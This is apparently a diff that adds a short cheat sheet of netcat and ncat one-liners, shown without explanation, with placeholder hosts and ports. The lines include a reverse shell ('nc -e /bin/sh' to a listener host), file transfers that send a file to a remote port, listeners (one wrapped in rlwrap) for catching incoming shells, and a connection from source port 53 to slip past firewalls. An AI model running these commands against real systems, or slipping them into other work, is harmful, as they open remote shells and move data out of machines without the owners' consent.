@@ -1,0 +1,9 @@
+ncat -nv --source-port 53 "$IP" "$PORT"
+nc -v "$IP" 21
+nc -nv "$IP" "$PORT"
+nc "$IP" "$LPORT" < "$FILE"
+nc -lvp "$LPORT" > "$FILE"
+ncat -l -p "$LPORT" --recv-only > "$FILE"
+nc -lvnp "$LPORT"
+rlwrap nc -lvnp "$LPORT"
+nc -e /bin/sh "$LHOST" "$LPORT"
